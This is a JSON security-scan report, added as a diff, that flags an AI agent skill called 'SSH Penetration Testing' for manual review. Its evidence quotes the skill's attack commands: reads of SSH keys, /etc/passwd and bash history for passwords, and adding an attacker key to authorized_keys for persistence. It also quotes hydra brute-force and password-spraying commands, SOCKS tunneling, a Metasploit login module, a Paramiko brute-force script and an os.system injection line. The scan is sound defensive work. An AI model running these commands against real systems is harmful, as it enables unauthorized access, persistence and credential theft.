@@ -1,0 +1,400 @@
+{
+  "metadata": {
+    "skill_name": "SSH Penetration Testing",
+    "version": "1.0.0",
+    "skill_path": "F:\\skill test",
+    "scan_time": "2026-04-04T22:23:41.156246",
+    "engine_version": "OpenClaw-Risk-Platform-V1"
+  },
+  "summary": {
+    "risk_level": "HIGH",
+    "recommendation": "MANUAL_REVIEW",
+    "confidence": 0.9,
+    "finding_count": 6,
+    "severity_distribution": {
+      "critical": 0,
+      "high": 1,
+      "medium": 1,
+      "low": 4
+    },
+    "overall_summary": "存在 1 项高危风险，必须经安全员人工审计后方可发布。"
+  },
+  "findings": [
+    {
+      "title": "static script analysis",
+      "level": "high",
+      "evidence": [
+        {
+          "file": "F:\\skill test\\semgrep\\app.py",
+          "line": 15,
+          "pattern": "system",
+          "severity": "high",
+          "content": "os.system(\"echo \" + username)  # 危险！",
+          "type": "dangerous_command"
+        },
+        {
+          "file": "F:\\skill test\\semgrep\\app.py",
+          "line": 15,
+          "pattern": "os.system",
+          "severity": "high",
+          "content": "os.system(\"echo \" + username)  # 危险！",
+          "type": "dangerous_command"
+        }
+      ],
+      "summary": {
+        "total_findings": 2,
+        "dangerous_commands": 2,
+        "download_execute_chains": 0,
+        "persistence_behaviors": 0,
+        "network_operations": 0,
+        "obfuscation_code": 0
+      }
+    },
+    {
+      "title": "file permission and sensitive path analysis",
+      "level": "critical",
+      "evidence": [
+        {
+          "file": "F:\\skill test\\SKILL.md",
+          "line": 188,
+          "target_path": "/root",
+          "level": "critical",
+          "reason": "根用户主目录",
+          "content": "/root/.ssh/",
+          "type": "sensitive_path"
+        },
+        {
+          "file": "F:\\skill test\\SKILL.md",
+          "line": 188,
+          "target_path": "/root/.ssh",
+          "level": "critical",
+          "reason": "根用户SSH密钥",
+          "content": "/root/.ssh/",
+          "type": "sensitive_path"
+        },
+        {
+          "file": "F:\\skill test\\SKILL.md",
+          "line": 319,
+          "target_path": "/etc/passwd",
+          "level": "critical",
+          "reason": "用户账户文件",
+          "content": "cat /etc/passwd | grep -v nologin",
+          "type": "sensitive_path"
+        },
+        {
+          "file": "F:\\skill test\\SKILL.md",
+          "line": 316,
+          "target_path": "/etc/ssh/sshd_config",
+          "level": "high",
+          "reason": "SSH配置",
+          "content": "cat /etc/ssh/sshd_config",
+          "type": "critical_config"
+        },
+        {
+          "file": "F:\\skill test\\SKILL.md",
+          "line": 183,
+          "target_file": ".ssh",
+          "level": "high",
+          "reason": "SSH密钥",
+          "content": "~/.ssh/id_rsa",
+          "type": "private_file"
+        },
+        {
+          "file": "F:\\skill test\\SKILL.md",
+          "line": 184,
+          "target_file": ".ssh",
+          "level": "high",
+          "reason": "SSH密钥",
+          "content": "~/.ssh/id_dsa",
+          "type": "private_file"
+        },
+        {
+          "file": "F:\\skill test\\SKILL.md",
+          "line": 185,
+          "target_file": ".ssh",
+          "level": "high",
+          "reason": "SSH密钥",
+          "content": "~/.ssh/id_ecdsa",
+          "type": "private_file"
+        },
+        {
+          "file": "F:\\skill test\\SKILL.md",
+          "line": 186,
+          "target_file": ".ssh",
+          "level": "high",
+          "reason": "SSH密钥",
+          "content": "~/.ssh/id_ed25519",
+          "type": "private_file"
+        },
+        {
+          "file": "F:\\skill test\\SKILL.md",
+          "line": 188,
+          "target_file": ".ssh",
+          "level": "high",
+          "reason": "SSH密钥",
+          "content": "/root/.ssh/",
+          "type": "private_file"
+        },
+        {
+          "file": "F:\\skill test\\SKILL.md",
+          "line": 189,
+          "target_file": ".ssh",
+          "level": "high",
+          "reason": "SSH密钥",
+          "content": "/home/*/.ssh/",
+          "type": "private_file"
+        },
+        {
+          "file": "F:\\skill test\\SKILL.md",
+          "line": 192,
+          "target_file": ".ssh",
+          "level": "high",
+          "reason": "SSH密钥",
+          "content": "curl -s http://target.com/.ssh/id_rsa",
+          "type": "private_file"
+        },
+        {
+          "file": "F:\\skill test\\SKILL.md",
+          "line": 308,
+          "target_file": ".ssh",
+          "level": "high",
+          "reason": "SSH密钥",
+          "content": "ls -la ~/.ssh/",
+          "type": "private_file"
+        },
+        {
+          "file": "F:\\skill test\\SKILL.md",
+          "line": 309,
+          "target_file": ".ssh",
+          "level": "high",
+          "reason": "SSH密钥",
+          "content": "cat ~/.ssh/known_hosts",
+          "type": "private_file"
+        },
+        {
+          "file": "F:\\skill test\\SKILL.md",
+          "line": 310,
+          "target_file": ".ssh",
+          "level": "high",
+          "reason": "SSH密钥",
+          "content": "cat ~/.ssh/authorized_keys",
+          "type": "private_file"
+        },
+        {
+          "file": "F:\\skill test\\SKILL.md",
+          "line": 313,
+          "target_file": ".ssh",
+          "level": "high",
+          "reason": "SSH密钥",
+          "content": "echo \"ssh-rsa AAAAB3...\" >> ~/.ssh/authorized_keys",
+          "type": "private_file"
+        },
+        {
+          "file": "F:\\skill test\\SKILL.md",
+          "line": 323,
+          "target_file": ".bash_history",
+          "level": "medium",
+          "reason": "命令历史",
+          "content": "cat ~/.bash_history | grep -i ssh",
+          "type": "private_file"
+        },
+        {
+          "file": "F:\\skill test\\SKILL.md",
+          "line": 324,
+          "target_file": ".bash_history",
+          "level": "medium",
+          "reason": "命令历史",
+          "content": "cat ~/.bash_history | grep -i pass",
+          "type": "private_file"
+        }
+      ],
+      "summary": {
+        "total_findings": 17,
+        "sensitive_paths": 3,
+        "critical_configs": 1,
+        "private_files": 13,
+        "log_operations": 0,
+        "permission_changes": 0
+      }
+    },
+    {
+      "title": "检测敏感路径访问",
+      "level": "high",
+      "evidence": [
+        "F:\\skill test\\SKILL.md:319:cat /etc/passwd | grep -v nologin"
+      ],
+      "summary": "规则引擎检测到: 检测敏感路径访问",
+      "rule_id": "sensitive-path-access",
+      "source": "builtin/sensitive_path_rules.yaml"
+    },
+    {
+      "title": "dangerous command rule placeholder",
+      "level": "info",
+      "evidence": []
+    },
+    {
+      "agent": "semantic_audit",
+      "type": "static_pattern_match",
+      "risk_level": "high",
+      "confidence": 0.8,
+      "evidence": [
+        {
+          "pattern": "bypass",
+          "matched_text": "bypass",
+          "location": "Offset: 4445"
+        }
+      ],
+      "reason": "匹配到 1 处已知的恶意提示词模式",
+      "file": "SKILL.md"
+    },
+    {
+      "agent": "semantic_audit",
+      "type": "semantic_analysis",
+      "risk_level": "medium",
+      "confidence": 0.9,
+      "evidence": [
+        {
+          "type": "越权行为",
+          "evidence": "Phase 8: Post-Exploitation...\nbash\n# Add persistence (add your key)\necho \"ssh-rsa AAAAB3...\" >> ~/.ssh/authorized_keys\n...\n# History for credentials\ncat ~/.bash_history | grep -i pass\n",
+          "reason": "Skill提供了明确的、超出安全评估范围的攻击后持久化技术与凭证窃取方法。'Add persistence' 指令旨在帮助攻击者在成功入侵后维持非法访问权限，属于典型的红队/攻击行为，而非纯粹的审计或安全评估。这与其宣称的'SSH Penetration Testing'功能边界不符，且可能被滥用进行非法活动。"
+        },
+        {
+          "type": "越权行为",
+          "evidence": "Phase 4: Credential Attacks...\nbash\n# Brute-Force with Hydra\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100\n...\n# Password Spraying\nfor pass in \"Password123\" \"Welcome1\" \"Summer2024!\"; do\n    hydra -L users.txt -p \"$pass\" ssh://192.168.1.100\ndone\n",
+          "reason": "Skill详细提供了针对SSH服务的主动暴力破解和密码喷洒攻击的具体命令和参数。虽然这在渗透测试范畴内，但对于一个运行在受信平台上的Skill来说，提供可直接执行的攻击载荷（而非仅方法论或防御建议）属于高权限操作。若无严格的授权和上下文约束，易被滥用于未经授权的攻击。"
+        },
+        {
+          "type": "越权行为",
+          "evidence": "Phase 7: SSH Tunneling and Port Forwarding...\nbash\n# Dynamic Port Forwarding (SOCKS Proxy)\nssh -D 1080 user@192.168.1.100\n# Use with proxychains\nproxychains nmap -sT -Pn 192.168.1.0/24\n\nPhase 10: Metasploit SSH Modules...\nbash\nuse auxiliary/scanner/ssh/ssh_login\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nrun\n",
+          "reason": "Skill包含了建立网络代理（用于内网穿透）和使用Metasploit框架进行自动化攻击的详细指南。这些行为明显超出简单的安全配置检查或漏洞扫描，属于主动攻击和横向移动技术，权限要求高，潜在危害大，与其作为平台上一个功能组件的定位不符，存在被滥用于内网渗透的风险。"
+        },
+        {
+          "type": "隐蔽社会工程",
+          "evidence": "Phase 9: Custom SSH Scripts with Paramiko...\npython\ndef ssh_brute_force(host, username, wordlist):\n    ...\n    for password in passwords:\n        client = ssh_connect(host, username, password.strip())\n        if client:\n            # Run post-exploitation commands\n            output, _ = execute_command(client, 'id; uname -a')\n            print(output)\n            return True\n    return False\n",
+          "reason": "Skill不仅提供攻击命令，还提供了可复制粘贴的完整Python自动化攻击脚本。这极大地降低了攻击门槛，用户可能在不完全理解其法律和安全后果的情况下直接运行代码。脚本包含了连接成功后自动执行系统命令（'id; uname -a'）的'post-exploitation'步骤，具有明确的攻击导向，可能诱导用户执行入侵行为。"
+        }
+      ],
+      "reason": "该Skill本质上是一个完整的SSH攻击工具包，包含了从侦查到后渗透的完整攻击链技术细节和自动化脚本，虽在专业渗透测试场景下有其价值，但作为平台Skill存在明确的滥用风险，且其行为模式（如持久化、横向移动）远超常规安全评估需求。",
+      "file": "SKILL.md"
+    }
+  ],
+  "parsed_facts": {
+    "structure": {
+      "path": "F:\\skill test",
+      "skill_md_found": true,
+      "manifest_files": [
+        "SKILL.md"
+      ],
+      "entry_points": [
+        {
+          "path": "semgrep/app.py",
+          "type": "nested"
+        }
+      ],
+      "files": [
+        {
+          "path": "package.json",
+          "name": "package.json",
+          "suffix": ".json",
+          "size": 63
+        },
+        {
+          "path": "requirements.txt",
+          "name": "requirements.txt",
+          "suffix": ".txt",
+          "size": 44
+        },
+        {
+          "path": "result.json",
+          "name": "result.json",
+          "suffix": ".json",
+          "size": 62381
+        },
+        {
+          "path": "SKILL.md",
+          "name": "SKILL.md",
+          "suffix": ".md",
+          "size": 12140
+        },
+        {
+          "path": "semgrep/app.py",
+          "name": "app.py",
+          "suffix": ".py",
+          "size": 441
+        },
+        {
+          "path": "semgrep/semgrep_result.json",
+          "name": "semgrep_result.json",
+          "suffix": ".json",
+          "size": 4224
+        }
+      ],
+      "structure": {
+        "total_files": 6,
+        "total_dirs": 1,
+        "subdirectories": [
+          "semgrep"
+        ],
+        "file_types": {
+          ".json": 3,
+          ".txt": 1,
+          ".md": 1,
+          ".py": 1
+        },
+        "manifest_files": [
+          "SKILL.md"
+        ]
+      },
+      "errors": []
+    },
+    "manifest": {
+      "name": "SSH Penetration Testing",
+      "version": "1.0.0",
+      "description": "This skill should be used when the user asks to \"pentest SSH services\", \"enumerate SSH configurations\", \"brute force SSH credentials\", \"exploit SSH vulnerabilities\", \"perform SSH tunneling\", or \"audit SSH security\". It provides comprehensive SSH penetration testing methodologies and techniques.",
+      "author": "",
+      "license": "",
+      "compatible_versions": [],
+      "dependencies": [],
+      "tags": [
+        "ssh",
+        "penetration-testing",
+        "brute-force",
+        "tunneling",
+        "enumeration",
+        "security"
+      ],
+      "custom_fields": {},
+      "path": "F:\\skill test",
+      "manifest_files": [
+        "SKILL.md"
+      ],
+      "frontmatter_found": true,
+      "manifest_source": "SKILL.md",
+      "parse_errors": [],
+      "is_valid": true
+    },
+    "validation": {
+      "warnings": [],
+      "errors": [],
+      "checks": {
+        "skill_md_found": true,
+        "manifest_found": true,
+        "name_available": true,
+        "version_valid": true,
+        "file_count_reasonable": true
+      }
+    }
+  },
+  "decision_logic": {
+    "risk_level": "HIGH",
+    "suggestion": "MANUAL_REVIEW",
+    "confidence": 0.9,
+    "summary": "存在 1 项高危风险，必须经安全员人工审计后方可发布。",
+    "details": {
+      "critical_count": 0,
+      "high_count": 1,
+      "medium_count": 1,
+      "low_count": 4
+    }
+  }
+}
